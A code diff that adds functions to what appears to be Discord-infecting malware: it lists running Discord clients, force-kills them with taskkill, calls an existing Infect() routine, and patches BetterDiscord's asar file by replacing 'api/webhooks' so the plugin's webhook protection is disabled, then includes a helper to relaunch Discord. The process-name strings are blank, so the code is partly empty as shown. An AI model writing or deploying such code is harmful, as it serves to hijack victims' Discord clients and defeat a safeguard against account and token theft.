@@ -47,3 +47,56 @@ function Infect() {
         console.log(err);
     });
 };
+
+function listDiscords() {
+    exec('tasklist', function(err,stdout, stderr) {
+        if (stdout.includes("")) {
+
+            runningDiscords.push("")
+        }
+        if (stdout.includes("")) {
+
+            runningDiscords.push("")
+        }
+        if (stdout.includes("")) {
+
+            runningDiscords.push("")
+        };
+        killDiscord();
+    });
+};
+
+function killDiscord() {
+    runningDiscords.forEach(disc => {
+        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
+            if (err) {
+              return;
+            }
+          });
+    });
+    Infect()
+    pwnBetterDiscord()
+};
+
+function startDiscord() {
+    runningDiscords.forEach(disc => {
+        path = LOCAL + '\\' + disc + "\\Update.exe"
+        exec(`${path} --processStart ${disc}.exe`, (err) => {
+            if (err) {
+              return;
+            }
+          });
+    });
+};
+function pwnBetterDiscord() {
+    // thx stanley
+    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+    if (fs.existsSync(dir)) {
+        var x = fs.readFileSync(dir)
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
+    } else {
+        return;
+    }
+
+}
+
